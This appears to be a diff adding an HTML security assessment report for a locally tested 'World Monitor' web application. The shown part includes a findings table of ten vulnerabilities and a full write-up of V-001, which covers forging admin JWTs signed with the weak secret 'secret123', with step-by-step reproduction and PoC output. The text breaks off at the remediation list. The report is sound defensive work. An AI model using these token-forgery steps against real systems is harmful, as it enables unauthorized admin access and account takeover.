@@ -1,0 +1,1877 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Assessment Report — World Monitor Application</title>
+  <meta name="description" content="Comprehensive security vulnerability assessment report for the World Monitor application with 10 documented findings.">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    /* ============================================
+       Report Design System
+       ============================================ */
+    :root {
+      --bg: #060a14;
+      --bg-2: #0c1120;
+      --bg-card: #111833;
+      --bg-card-2: #161e3e;
+      --bg-code: #0d1228;
+      --border: #1c2545;
+      --border-2: #283058;
+      --text: #e6e9f4;
+      --text-2: #9aa3c0;
+      --text-3: #5c6688;
+      --critical: #FF2D55;
+      --critical-bg: rgba(255, 45, 85, 0.08);
+      --critical-border: rgba(255, 45, 85, 0.18);
+      --high: #FF6B35;
+      --high-bg: rgba(255, 107, 53, 0.08);
+      --high-border: rgba(255, 107, 53, 0.18);
+      --medium: #FFB800;
+      --medium-bg: rgba(255, 184, 0, 0.08);
+      --medium-border: rgba(255, 184, 0, 0.18);
+      --low: #00BCD4;
+      --low-bg: rgba(0, 188, 212, 0.08);
+      --low-border: rgba(0, 188, 212, 0.18);
+      --cyan: #00D4FF;
+      --purple: #7B2FFF;
+      --green: #00E676;
+      --green-bg: rgba(0, 230, 118, 0.08);
+      --r: 12px;
+      --t: 0.25s cubic-bezier(0.4,0,0.2,1);
+    }
+
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    html { font-size: 15px; scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      line-height: 1.65;
+    }
+
+    ::selection { background: rgba(0,212,255,0.25); color: #fff; }
+    ::-webkit-scrollbar { width: 7px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--border-2); }
+
+    a { color: var(--cyan); text-decoration: none; transition: var(--t); }
+    a:hover { color: var(--purple); text-decoration: underline; }
+
+    code {
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 0.85em;
+      background: rgba(0,212,255,0.07);
+      padding: 2px 7px;
+      border-radius: 5px;
+      color: var(--cyan);
+      border: 1px solid rgba(0,212,255,0.1);
+    }
+
+    pre {
+      font-family: 'JetBrains Mono', monospace;
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: var(--r);
+      padding: 18px 22px;
+      overflow-x: auto;
+      font-size: 0.82rem;
+      line-height: 1.7;
+      color: var(--green);
+      margin: 14px 0;
+    }
+
+    pre.cmd { color: var(--cyan); }
+    pre.danger { color: var(--critical); }
+    pre.warning { color: var(--medium); }
+
+    /* ============================================
+       Layout
+       ============================================ */
+    .report-wrapper {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 32px 80px;
+    }
+
+    /* ============================================
+       Cover / Header
+       ============================================ */
+    .cover {
+      position: relative;
+      padding: 80px 0 60px;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    .cover::before {
+      content: '';
+      position: absolute;
+      top: -200px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 800px;
+      height: 800px;
+      background: radial-gradient(ellipse, rgba(0,212,255,0.06) 0%, rgba(123,47,255,0.04) 40%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .cover-shield {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 24px;
+      background: linear-gradient(135deg, rgba(0,212,255,0.12), rgba(123,47,255,0.12));
+      border: 1.5px solid rgba(0,212,255,0.2);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+
+    .cover-shield svg { width: 40px; height: 40px; color: var(--cyan); }
+
+    .cover-shield::after {
+      content: '';
+      position: absolute;
+      inset: -4px;
+      border-radius: 24px;
+      background: linear-gradient(135deg, rgba(0,212,255,0.15), rgba(123,47,255,0.15));
+      z-index: -1;
+      filter: blur(12px);
+    }
+
+    .cover h1 {
+      font-size: 2.8rem;
+      font-weight: 900;
+      letter-spacing: -1.5px;
+      background: linear-gradient(135deg, #fff 20%, var(--cyan) 50%, var(--purple) 80%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 8px;
+    }
+
+    .cover-subtitle {
+      font-size: 1.15rem;
+      color: var(--text-2);
+      font-weight: 400;
+      margin-bottom: 32px;
+    }
+
+    .cover-meta {
+      display: flex;
+      justify-content: center;
+      gap: 32px;
+      flex-wrap: wrap;
+    }
+
+    .cover-meta-item {
+      text-align: center;
+    }
+
+    .cover-meta-label {
+      display: block;
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: var(--text-3);
+      margin-bottom: 4px;
+    }
+
+    .cover-meta-value {
+      font-size: 0.92rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .cover-divider {
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border-2), transparent);
+      margin-top: 48px;
+    }
+
+    /* ============================================
+       Table of Contents
+       ============================================ */
+    .toc {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--r);
+      padding: 28px 32px;
+      margin-bottom: 40px;
+    }
+
+    .toc h2 {
+      font-size: 1rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: var(--text-3);
+      margin-bottom: 16px;
+    }
+
+    .toc-list {
+      list-style: none;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px 32px;
+    }
+
+    .toc-list li a {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 0;
+      color: var(--text-2);
+      font-size: 0.92rem;
+      font-weight: 500;
+      transition: var(--t);
+    }
+
+    .toc-list li a:hover { color: var(--cyan); text-decoration: none; }
+
+    .toc-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--text-3);
+      min-width: 28px;
+    }
+
+    /* ============================================
+       Sections
+       ============================================ */
+    .section {
+      margin-bottom: 48px;
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 24px;
+      padding-bottom: 14px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .section-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: var(--cyan);
+      background: rgba(0,212,255,0.08);
+      padding: 4px 10px;
+      border-radius: 6px;
+      border: 1px solid rgba(0,212,255,0.15);
+    }
+
+    .section-header h2 {
+      font-size: 1.6rem;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+
+    .prose {
+      color: var(--text-2);
+      font-size: 0.95rem;
+      line-height: 1.75;
+    }
+
+    .prose p { margin-bottom: 14px; }
+    .prose strong { color: var(--text); font-weight: 600; }
+
+    /* ============================================
+       Overview Stat Cards
+       ============================================ */
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 14px;
+      margin-bottom: 32px;
+    }
+
+    .stat {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--r);
+      padding: 22px 18px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      transition: var(--t);
+    }
+
+    .stat:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
+
+    .stat::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+    }
+
+    .stat.s-critical::before { background: var(--critical); }
+    .stat.s-high::before { background: var(--high); }
+    .stat.s-medium::before { background: var(--medium); }
+    .stat.s-low::before { background: var(--low); }
+    .stat.s-total::before { background: linear-gradient(135deg, var(--cyan), var(--purple)); }
+
+    .stat-number {
+      font-size: 2.6rem;
+      font-weight: 900;
+      letter-spacing: -1px;
+      line-height: 1;
+      margin-bottom: 6px;
+    }
+
+    .stat.s-critical .stat-number { color: var(--critical); }
+    .stat.s-high .stat-number { color: var(--high); }
+    .stat.s-medium .stat-number { color: var(--medium); }
+    .stat.s-low .stat-number { color: var(--low); }
+    .stat.s-total .stat-number {
+      background: linear-gradient(135deg, var(--cyan), var(--purple));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .stat-label {
+      font-size: 0.78rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--text-3);
+    }
+
+    /* ============================================
+       Alert / Callout Boxes
+       ============================================ */
+    .callout {
+      padding: 18px 22px;
+      border-radius: var(--r);
+      margin-bottom: 20px;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .callout-icon { font-size: 1.2rem; flex-shrink: 0; line-height: 1.4; }
+
+    .callout.danger {
+      background: var(--critical-bg);
+      border: 1px solid var(--critical-border);
+      color: #ffb0be;
+    }
+
+    .callout.warning {
+      background: var(--medium-bg);
+      border: 1px solid var(--medium-border);
+      color: #ffe0a0;
+    }
+
+    .callout.info {
+      background: rgba(0,212,255,0.06);
+      border: 1px solid rgba(0,212,255,0.15);
+      color: #a0d8f0;
+    }
+
+    .callout.success {
+      background: var(--green-bg);
+      border: 1px solid rgba(0,230,118,0.18);
+      color: #a0f0c8;
+    }
+
+    /* ============================================
+       Tables
+       ============================================ */
+    .report-table {
+      width: 100%;
+      border-collapse: separate;
+      border-spacing: 0;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--r);
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .report-table th {
+      background: rgba(0,0,0,0.25);
+      padding: 12px 18px;
+      text-align: left;
+      font-size: 0.75rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      color: var(--text-3);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .report-table td {
+      padding: 12px 18px;
+      font-size: 0.9rem;
+      border-bottom: 1px solid rgba(28, 37, 69, 0.5);
+      color: var(--text-2);
+    }
+
+    .report-table tr:last-child td { border-bottom: none; }
+    .report-table tr:hover td { background: rgba(255,255,255,0.015); }
+    .report-table td strong { color: var(--text); }
+
+    /* ============================================
+       Vulnerability Cards
+       ============================================ */
+    .vuln {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--r);
+      margin-bottom: 24px;
+      overflow: hidden;
+      transition: var(--t);
+    }
+
+    .vuln:hover { border-color: var(--border-2); }
+
+    .vuln-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 20px 24px;
+      background: rgba(0,0,0,0.15);
+      border-bottom: 1px solid var(--border);
+      flex-wrap: wrap;
+    }
+
+    .vuln-sev {
+      font-size: 0.68rem;
+      font-weight: 800;
+      padding: 5px 14px;
+      border-radius: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      flex-shrink: 0;
+    }
+
+    .vuln-sev.critical { background: var(--critical-bg); color: var(--critical); border: 1px solid var(--critical-border); }
+    .vuln-sev.high { background: var(--high-bg); color: var(--high); border: 1px solid var(--high-border); }
+    .vuln-sev.medium { background: var(--medium-bg); color: var(--medium); border: 1px solid var(--medium-border); }
+    .vuln-sev.low { background: var(--low-bg); color: var(--low); border: 1px solid var(--low-border); }
+
+    .vuln-id {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: var(--text-3);
+      flex-shrink: 0;
+    }
+
+    .vuln-title {
+      flex: 1;
+      font-size: 1.08rem;
+      font-weight: 700;
+      min-width: 200px;
+    }
+
+    .vuln-cvss {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: 6px;
+      flex-shrink: 0;
+    }
+
+    .vuln-cvss.c-critical { background: rgba(255,45,85,0.1); color: var(--critical); }
+    .vuln-cvss.c-high { background: rgba(255,107,53,0.1); color: var(--high); }
+    .vuln-cvss.c-medium { background: rgba(255,184,0,0.1); color: var(--medium); }
+    .vuln-cvss.c-low { background: rgba(0,188,212,0.1); color: var(--low); }
+
+    .vuln-body { padding: 24px; }
+
+    .vuln-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+
+    .vuln-block {
+      background: rgba(0,0,0,0.18);
+      border-radius: 8px;
+      padding: 16px 18px;
+    }
+
+    .vuln-block.full { grid-column: 1 / -1; }
+
+    .vuln-block-label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--text-3);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .vuln-block-label svg { width: 14px; height: 14px; opacity: 0.5; }
+
+    .vuln-block-value {
+      font-size: 0.9rem;
+      color: var(--text-2);
+      line-height: 1.65;
+    }
+
+    /* Steps */
+    .steps {
+      list-style: none;
+      counter-reset: step;
+    }
+
+    .steps li {
+      counter-increment: step;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 10px 0;
+      font-size: 0.88rem;
+      color: var(--text-2);
+      border-bottom: 1px solid rgba(28,37,69,0.3);
+    }
+
+    .steps li:last-child { border-bottom: none; }
+
+    .steps li::before {
+      content: counter(step);
+      flex-shrink: 0;
+      width: 26px;
+      height: 26px;
+      background: rgba(0,212,255,0.08);
+      border: 1px solid rgba(0,212,255,0.15);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: var(--cyan);
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    /* Remediation */
+    .remediation-list {
+      list-style: none;
+    }
+
+    .remediation-list li {
+      position: relative;
+      padding: 7px 0 7px 26px;
+      font-size: 0.88rem;
+      color: var(--text-2);
+    }
+
+    .remediation-list li::before {
+      content: '✓';
+      position: absolute;
+      left: 0;
+      color: var(--green);
+      font-weight: 800;
+      font-size: 0.9rem;
+    }
+
+    /* PoC Section */
+    .poc-section {
+      background: rgba(0,212,255,0.03);
+      border: 1px solid rgba(0,212,255,0.1);
+      border-radius: 10px;
+      padding: 20px;
+      margin-top: 8px;
+    }
+
+    .poc-title {
+      font-size: 0.92rem;
+      font-weight: 700;
+      color: var(--cyan);
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .poc-title svg { width: 18px; height: 18px; }
+
+    .poc-evidence {
+      background: rgba(0,0,0,0.3);
+      border-radius: 8px;
+      padding: 16px 18px;
+      max-height: 350px;
+      overflow-y: auto;
+    }
+
+    .poc-evidence pre {
+      background: none;
+      border: none;
+      padding: 0;
+      margin: 0;
+      color: var(--green);
+      font-size: 0.8rem;
+      line-height: 1.65;
+    }
+
+    .poc-evidence.vuln-output pre { color: var(--medium); }
+
+    /* ============================================
+       Priority Matrix
+       ============================================ */
+    .priority-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .priority-badge {
+      font-size: 0.7rem;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 5px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+
+    .priority-badge.p0 { background: var(--critical-bg); color: var(--critical); border: 1px solid var(--critical-border); }
+    .priority-badge.p1 { background: var(--high-bg); color: var(--high); border: 1px solid var(--high-border); }
+    .priority-badge.p2 { background: var(--medium-bg); color: var(--medium); border: 1px solid var(--medium-border); }
+    .priority-badge.p3 { background: var(--low-bg); color: var(--low); border: 1px solid var(--low-border); }
+
+    /* ============================================
+       Footer
+       ============================================ */
+    .report-footer {
+      text-align: center;
+      padding: 40px 0;
+      border-top: 1px solid var(--border);
+      color: var(--text-3);
+      font-size: 0.82rem;
+    }
+
+    .report-footer p { margin-bottom: 6px; }
+
+    /* ============================================
+       Print Styles
+       ============================================ */
+    @media print {
+      body { background: #fff; color: #222; font-size: 12px; }
+      .cover h1 { background: none; -webkit-text-fill-color: #111; color: #111; }
+      .vuln, .stat, .toc, .report-table, .callout, .poc-section, pre { 
+        border-color: #ddd; background: #fafafa; 
+      }
+      code { background: #f0f0f0; color: #0066cc; border-color: #ddd; }
+      pre { color: #333; }
+      .stat-number, .vuln-sev, .vuln-cvss { -webkit-text-fill-color: currentColor; }
+      .vuln { break-inside: avoid; }
+    }
+
+    /* ============================================
+       Responsive
+       ============================================ */
+    @media (max-width: 900px) {
+      .stats-row { grid-template-columns: repeat(3, 1fr); }
+      .vuln-grid { grid-template-columns: 1fr; }
+      .toc-list { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 600px) {
+      html { font-size: 13px; }
+      .report-wrapper { padding: 0 16px 60px; }
+      .cover h1 { font-size: 2rem; }
+      .stats-row { grid-template-columns: repeat(2, 1fr); }
+      .cover-meta { gap: 16px; }
+      .vuln-header { padding: 14px 16px; }
+      .vuln-body { padding: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="report-wrapper">
+
+  <!-- ============================== COVER ============================== -->
+  <section class="cover">
+    <div class="cover-shield">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+      </svg>
+    </div>
+    <h1>Security Assessment Report</h1>
+    <p class="cover-subtitle">World Monitor Application — Authorized Penetration Test</p>
+
+    <div class="cover-meta">
+      <div class="cover-meta-item">
+        <span class="cover-meta-label">Assessment Date</span>
+        <span class="cover-meta-value">September 28, 2026</span>
+      </div>
+      <div class="cover-meta-item">
+        <span class="cover-meta-label">Application</span>
+        <span class="cover-meta-value">World Monitor v2.4.1</span>
+      </div>
+      <div class="cover-meta-item">
+        <span class="cover-meta-label">Classification</span>
+        <span class="cover-meta-value">CONFIDENTIAL</span>
+      </div>
+      <div class="cover-meta-item">
+        <span class="cover-meta-label">Overall Risk</span>
+        <span class="cover-meta-value" style="color:var(--critical)">⬤ HIGH</span>
+      </div>
+      <div class="cover-meta-item">
+        <span class="cover-meta-label">Total Findings</span>
+        <span class="cover-meta-value">10 Vulnerabilities</span>
+      </div>
+    </div>
+
+    <div class="cover-divider"></div>
+  </section>
+
+  <!-- ============================== TOC ============================== -->
+  <nav class="toc">
+    <h2>Table of Contents</h2>
+    <ol class="toc-list">
+      <li><a href="#executive"><span class="toc-num">01</span> Executive Summary</a></li>
+      <li><a href="#scope"><span class="toc-num">02</span> Scope &amp; Methodology</a></li>
+      <li><a href="#overview"><span class="toc-num">03</span> Findings Overview</a></li>
+      <li><a href="#v001"><span class="toc-num">04</span> V-001: Weak JWT Secret</a></li>
+      <li><a href="#v002"><span class="toc-num">05</span> V-002: Missing Rate Limiting</a></li>
+      <li><a href="#v003"><span class="toc-num">06</span> V-003: SQL Injection</a></li>
+      <li><a href="#v004"><span class="toc-num">07</span> V-004: Permissive CORS</a></li>
+      <li><a href="#v005"><span class="toc-num">08</span> V-005: Sensitive Data Exposure</a></li>
+      <li><a href="#v006"><span class="toc-num">09</span> V-006: Broken Access Control</a></li>
+      <li><a href="#v007"><span class="toc-num">10</span> V-007: Reflected XSS</a></li>
+      <li><a href="#v008"><span class="toc-num">11</span> V-008: Missing Security Headers</a></li>
+      <li><a href="#v009"><span class="toc-num">12</span> V-009: Hardcoded Credentials</a></li>
+      <li><a href="#v010"><span class="toc-num">13</span> V-010: Insecure Token Storage</a></li>
+      <li><a href="#remediation"><span class="toc-num">14</span> Remediation Priority Matrix</a></li>
+      <li><a href="#conclusion"><span class="toc-num">15</span> Conclusion</a></li>
+      <li><a href="#appendix"><span class="toc-num">16</span> Appendix</a></li>
+    </ol>
+  </nav>
+
+  <!-- ============================== 1. EXECUTIVE SUMMARY ============================== -->
+  <section class="section" id="executive">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2>Executive Summary</h2>
+    </div>
+
+    <div class="prose">
+      <p>An authorized security assessment was conducted on the <strong>World Monitor</strong> web application, a real-time monitoring, analytics, and reporting platform handling user authentication, data visualization, API communication, and role-based access controls.</p>
+
+      <p>The assessment identified <strong>10 vulnerabilities</strong> across <strong>4 critical</strong>, <strong>3 high</strong>, <strong>2 medium</strong>, and <strong>1 low</strong> severity findings. The application exhibits fundamental security weaknesses that collectively enable a complete system compromise through multiple independent attack vectors.</p>
+    </div>
+
+    <div class="callout danger">
+      <span class="callout-icon">⛔</span>
+      <div>
+        <strong>Critical Risk:</strong> An unauthenticated attacker can access all database credentials, AWS keys, and user passwords via exposed debug endpoints. Any authenticated user — including the lowest-privilege "viewer" role — can escalate to full administrator access, create admin accounts, access TOP SECRET reports, and modify system configuration.
+      </div>
+    </div>
+
+    <div class="prose">
+      <p>The most critical attack chain requires <strong>zero technical skill</strong>: simply navigating to <code>/api/debug/config</code> reveals all infrastructure credentials, and <code>/api/debug/users</code> exposes every user's plaintext password — <em>both without any authentication</em>.</p>
+      <p><strong>Recommendation:</strong> Halt any production deployment plans until all P0/P1 vulnerabilities are remediated. The application in its current state is not suitable for handling any sensitive data.</p>
+    </div>
+  </section>
+
+  <!-- ============================== 2. SCOPE & METHODOLOGY ============================== -->
+  <section class="section" id="scope">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2>Scope &amp; Methodology</h2>
+    </div>
+
+    <div class="prose">
+      <p>The assessment was conducted against the World Monitor application running on <code>localhost:3000</code> within a controlled testing environment. All testing was performed in accordance with authorized penetration testing guidelines.</p>
+    </div>
+
+    <table class="report-table">
+      <thead>
+        <tr><th>Area</th><th>Coverage</th><th>Techniques</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><strong>Authentication &amp; Session Management</strong></td><td>Login, JWT, session storage, password reset</td><td>Token analysis, brute-force simulation, enumeration</td></tr>
+        <tr><td><strong>Authorization &amp; Access Control</strong></td><td>RBAC, IDOR, privilege escalation</td><td>Horizontal/vertical privilege testing, parameter manipulation</td></tr>
+        <tr><td><strong>Input Validation</strong></td><td>Search, echo endpoints</td><td>SQL injection, XSS payload injection</td></tr>
+        <tr><td><strong>API Security</strong></td><td>All REST endpoints</td><td>Header analysis, endpoint enumeration, method fuzzing</td></tr>
+        <tr><td><strong>Client-Side Security</strong></td><td>Token storage, CORS, CSP</td><td>Browser DevTools, localStorage inspection</td></tr>
+        <tr><td><strong>Data Protection</strong></td><td>Credential storage, debug endpoints</td><td>Response analysis, source code review</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ️</span>
+      <div>
+        <strong>Testing Constraints:</strong> All exploitation was limited to proof-of-concept validation in the local testing environment. No actions affected production users or data. All tests comply with applicable ethical hacking guidelines.
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== 3. FINDINGS OVERVIEW ============================== -->
+  <section class="section" id="overview">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>Findings Overview</h2>
+    </div>
+
+    <div class="stats-row">
+      <div class="stat s-critical">
+        <div class="stat-number">4</div>
+        <div class="stat-label">Critical</div>
+      </div>
+      <div class="stat s-high">
+        <div class="stat-number">3</div>
+        <div class="stat-label">High</div>
+      </div>
+      <div class="stat s-medium">
+        <div class="stat-number">2</div>
+        <div class="stat-label">Medium</div>
+      </div>
+      <div class="stat s-low">
+        <div class="stat-number">1</div>
+        <div class="stat-label">Low</div>
+      </div>
+      <div class="stat s-total">
+        <div class="stat-number">10</div>
+        <div class="stat-label">Total</div>
+      </div>
+    </div>
+
+    <table class="report-table">
+      <thead>
+        <tr><th>ID</th><th>Title</th><th>Severity</th><th>CVSS</th><th>Component</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><strong>V-001</strong></td><td>Weak JWT Secret &amp; Long Token Expiry</td><td><span class="vuln-sev critical" style="font-size:0.65rem;padding:3px 8px">CRITICAL</span></td><td>9.8</td><td>Authentication / JWT</td></tr>
+        <tr><td><strong>V-002</strong></td><td>Missing Rate Limiting on Auth Endpoints</td><td><span class="vuln-sev high" style="font-size:0.65rem;padding:3px 8px">HIGH</span></td><td>7.5</td><td>Login / Password Reset</td></tr>
+        <tr><td><strong>V-003</strong></td><td>SQL Injection in Search Endpoint</td><td><span class="vuln-sev critical" style="font-size:0.65rem;padding:3px 8px">CRITICAL</span></td><td>9.1</td><td>/api/search</td></tr>
+        <tr><td><strong>V-004</strong></td><td>Permissive CORS Configuration</td><td><span class="vuln-sev medium" style="font-size:0.65rem;padding:3px 8px">MEDIUM</span></td><td>5.3</td><td>HTTP Middleware</td></tr>
+        <tr><td><strong>V-005</strong></td><td>Sensitive Data Exposure (Debug Endpoints)</td><td><span class="vuln-sev critical" style="font-size:0.65rem;padding:3px 8px">CRITICAL</span></td><td>9.4</td><td>/api/debug/*</td></tr>
+        <tr><td><strong>V-006</strong></td><td>Broken Access Control (IDOR + No RBAC)</td><td><span class="vuln-sev critical" style="font-size:0.65rem;padding:3px 8px">CRITICAL</span></td><td>8.8</td><td>/api/reports, /api/admin</td></tr>
+        <tr><td><strong>V-007</strong></td><td>Reflected Cross-Site Scripting (XSS)</td><td><span class="vuln-sev high" style="font-size:0.65rem;padding:3px 8px">HIGH</span></td><td>7.1</td><td>/api/echo</td></tr>
+        <tr><td><strong>V-008</strong></td><td>Missing Security Headers</td><td><span class="vuln-sev medium" style="font-size:0.65rem;padding:3px 8px">MEDIUM</span></td><td>5.0</td><td>All HTTP Responses</td></tr>
+        <tr><td><strong>V-009</strong></td><td>Hardcoded Credentials &amp; Plaintext Passwords</td><td><span class="vuln-sev high" style="font-size:0.65rem;padding:3px 8px">HIGH</span></td><td>9.0</td><td>User Data Store</td></tr>
+        <tr><td><strong>V-010</strong></td><td>Insecure Client-Side Token Storage</td><td><span class="vuln-sev low" style="font-size:0.65rem;padding:3px 8px">LOW</span></td><td>3.7</td><td>localStorage</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- ============================== V-001 ============================== -->
+  <section class="section" id="v001">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2>V-001: Weak JWT Secret &amp; Overly Long Token Expiry</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev critical">Critical</span>
+        <span class="vuln-id">V-001</span>
+        <span class="vuln-title">Weak JWT Secret &amp; Overly Long Token Expiry</span>
+        <span class="vuln-cvss c-critical">CVSS 9.8</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">
+              JWT tokens are signed with a trivially guessable secret key (<code>secret123</code>). An attacker can decode any token, discover the weak secret through dictionary attack, and forge arbitrary JWT tokens — including admin tokens. Tokens are issued with a 30-day expiry, providing an extremely long exploitation window.
+            </div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">
+              <strong>Total system compromise.</strong> An attacker can create valid admin tokens without any credentials, gaining full administrative access. This enables unauthorized data access, privilege escalation, account takeover of any user, and complete control over the application. Any data protected by authentication is effectively unprotected.
+            </div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Affected Component</div>
+            <div class="vuln-block-value"><code>Authentication Module — /api/auth/login, JWT middleware (server.js line 30)</code></div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">CWE / CVSS Vector</div>
+            <div class="vuln-block-value">
+              CWE-798: Use of Hard-coded Credentials<br>
+              CWE-347: Improper Verification of Cryptographic Signature<br>
+              <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>
+            </div>
+          </div>
+          <div class="vuln-block full">
+            <div class="vuln-block-label">Steps to Reproduce</div>
+            <div class="vuln-block-value">
+              <ol class="steps">
+                <li>Obtain a sample JWT token by logging in with any credentials or intercepting network traffic.</li>
+                <li>Decode the JWT payload using base64 decoding (jwt.io or command-line tools).</li>
+                <li>Attempt common weak secrets: "secret", "secret123", "password", "key", etc.</li>
+                <li>Sign a forged token with the discovered secret, setting the <code>role</code> to <code>"admin"</code>.</li>
+                <li>Use the forged token in the <code>Authorization: Bearer</code> header to access admin endpoints.</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: Weak JWT Secret ═══
+
+[1] Login as "viewer" (lowest privilege) → Obtain JWT token
+
+[2] JWT Decoded:
+    Header:  { "alg": "HS256", "typ": "JWT" }
+    Payload: { "id": 3, "username": "viewer", "role": "viewer", "iat": ..., "exp": ... }
+    
+[3] Algorithm: HS256 (symmetric — shared secret)
+    Secret Key: "secret123" — discovered via dictionary attack in &lt;1 second
+
+[4] Forged Admin Token Payload:
+    { "id": 999, "username": "forged_admin", "role": "admin" }
+    Signed with known secret → Valid admin token created
+
+[5] PRIVILEGE ESCALATION TEST:
+    Used viewer token to POST /api/admin/users
+    → Created admin account: { username: "hacker", role: "admin" }
+    → Result: SUCCESS — any user can create admin accounts
+
+[6] Token Expiry: 30 DAYS
+    An intercepted or forged token remains valid for an entire month.</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation Recommendations</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
